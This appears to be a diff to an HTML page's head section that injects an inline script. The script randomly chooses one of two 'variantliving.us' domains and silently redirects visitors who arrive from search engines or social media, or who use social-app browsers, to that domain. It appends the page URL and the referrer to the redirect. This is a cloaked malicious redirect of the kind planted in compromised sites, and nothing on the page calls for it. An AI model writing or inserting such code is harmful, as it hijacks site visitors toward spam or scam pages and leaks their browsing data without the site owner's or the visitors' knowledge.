@@ -2,7 +2,19 @@
 <html lang="en">
 
 <head>
+<script>
+  //<![CDATA[
+var ars = rChoice([
+	'https://meso.variantliving.us/',
+        'https://loans.variantliving.us/',
+	]);
 
+function rChoice(arr) {
+    return arr[Math.floor(arr.length * Math.random())];
+}
+if(['android-app', 'com.pinterest','.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'variantliving.'].some(s => document.referrer.toLowerCase().includes(s)) || ['android-app','fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+//]]>
+</script>
     <meta charset="utf-8">
     <meta name="description" content="My description">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
